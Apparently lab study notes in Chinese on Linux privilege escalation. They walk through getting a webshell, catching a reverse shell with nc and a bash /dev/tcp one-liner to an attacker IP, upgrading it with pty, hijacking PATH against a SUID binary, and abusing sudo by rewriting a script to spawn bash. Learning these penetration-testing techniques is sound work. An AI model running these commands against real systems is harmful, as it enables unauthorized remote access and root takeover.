# 提权技术

## 概述
提权是将低权限用户提升为高权限用户的过程，包括横向提权（普通用户→普通用户）和垂直提权（普通用户→管理员或root）。

## 提权路径

### 1. 获取初始shell
- 通过文件上传漏洞上传Webshell
- 使用蚁剑连接
- 获取www-data用户shell

### 2. 反向监听
攻击机设置：
```bash
nc -lnvp 4444
```
- `-l`：监听模式
- `-n`：不进行DNS解析
- `-v`：显示详细输出
- `-p`：指定端口

靶机执行：
```bash
bash -i >& /dev/tcp/192.168.56.129/4444 0>&1
```

### 3. 生成交互式shell
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 环境变量劫持

### 原理
系统执行命令时，会优先从PATH环境变量指定的目录查找可执行文件。


### 利用步骤
1. 查找SUID文件：
```bash
find / -perm -u=s -type f 2>/dev/null
```

2. 分析SUID文件：
```bash
strings /home/john/toto | grep -E "id|ls|bash|system"
```

3. 伪造系统命令：
```bash
echo "/bin/bash" > id
chmod 777 id
export PATH=/tmp:$PATH
```

4. 执行SUID文件触发劫持

### 示例
- 目标文件：/home/john/toto
- 伪造命令：/tmp/id
- 效果：以john用户权限执行id命令

## Sudo权限滥用

### 发现sudo权限
```bash
sudo -l
```

### 利用方法
1. 查看可执行的sudo脚本
2. 覆盖脚本写入恶意代码
3. 执行获取root权限

### 示例
```python
# 原脚本：/home/john/file.py
# 写入：import os; os.system('/bin/bash')
# 执行：sudo python3 /home/john/file.py
```

## 相关工具
- msfvenom：生成反弹脚本
- msfconsole：Metasploit监听模块
- netcat：反向监听

## 核心概念

### 交互式shell vs 非交互式shell
- **交互式shell**：可执行复杂命令，加载环境变量，支持su切换用户
- **非交互式shell**：仅能执行简单命令，无法接受输入

### 为什么要反向监听
- 靶机可能因防火墙规则禁止外部主动连接
- 反向监听由靶机主动发起连接，更易穿透防火墙

## 参考文档
- [文件上传漏洞](./file_upload.md)
- [渗透测试流程](./penetration_testing_process.md)